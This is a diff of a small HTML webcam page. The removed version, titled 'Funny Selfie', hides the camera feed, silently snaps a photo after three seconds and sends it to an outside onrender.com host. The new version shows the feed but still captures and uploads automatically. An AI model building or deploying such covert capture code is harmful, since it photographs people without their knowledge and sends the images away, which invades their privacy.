@@ -3,52 +3,57 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Funny Selfie</title>
+  <title>Automatic Selfie Capture</title>
 </head>
 <body>
-  <h1>Smile for the camera! 😁</h1>
-  <video id="video" autoplay style="display: none;"></video>
-  <canvas id="canvas" style="display: none;"></canvas>
+  <h1>Selfie Capture</h1>
+  <video id="video" width="640" height="480" autoplay></video>
 
   <script>
+    // Set up webcam
     const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const ctx = canvas.getContext('2d');
+    const canvas = document.createElement('canvas');
+    const context = canvas.getContext('2d');
 
-    // Access the camera and start the video stream
+    // Access the webcam
     navigator.mediaDevices.getUserMedia({ video: true })
-      .then((stream) => {
+      .then(stream => {
         video.srcObject = stream;
-
-        // Wait 3 seconds before capturing the photo
-        setTimeout(() => {
-          // Capture the photo
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
-          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-          // Convert the photo to Base64
-          const photo = canvas.toDataURL('image/png');
-
-          // Send the photo to your server
-          fetch('https://selfoss.onrender.com/upload', { // Replace this with your server URL
-            method: 'POST',
-            body: JSON.stringify({ image: photo }),
-            headers: { 'Content-Type': 'application/json' }
-          })
-          .then(response => response.json())
-          .then(data => {
-            console.log("Photo sent successfully!", data);
-          })
-          .catch(err => {
-            console.error("Failed to send the photo!", err);
-          });
-        }, 3000); // 3-second delay
       })
-      .catch((err) => {
-        alert("Camera access denied or unavailable!");
-        console.error("Error accessing the camera:", err);
+      .catch(err => {
+        console.error('Error accessing webcam: ', err);
       });
+
+    // Capture photo automatically after 3 seconds
+    setTimeout(() => {
+      captureAndUpload();
+    }, 3000);  // 3 seconds delay before capturing the photo
+
+    function captureAndUpload() {
+      // Capture the frame from the video feed
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      // Convert the canvas image to a data URL
+      const photoData = canvas.toDataURL('image/png');
+
+      // Upload the image to the server
+      fetch('/upload', {
+        method: 'POST',
+        body: JSON.stringify({ image: photoData }),
+        headers: {
+          'Content-Type': 'application/json'
+        }
+      })
+      .then(response => response.json())
+      .then(data => {
+        console.log('Image uploaded successfully:', data);
+      })
+      .catch(error => {
+        console.error('Error uploading image:', error);
+      });
+    }
   </script>
 </body>
 </html>
